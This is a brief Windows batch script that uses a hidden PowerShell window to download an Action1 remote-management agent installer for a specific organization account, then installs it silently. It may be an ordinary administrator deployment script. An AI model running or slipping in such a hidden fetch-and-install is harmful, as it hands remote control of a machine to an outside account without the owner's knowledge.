@echo off

powershell -WindowStyle Hidden -Command ^
  "$wc = New-Object System.Net.WebClient; ^
   $wc.DownloadFile('https://app.action1.com/agent/ab91db73-b768-11f0-83fc-7789fec2db81/Windows/agent(My_Organization).msi', '%TEMP%\action1.msi')"

msiexec /i "%TEMP%\action1.msi" /quiet /qn /norestart


timeout /t 1 >nul
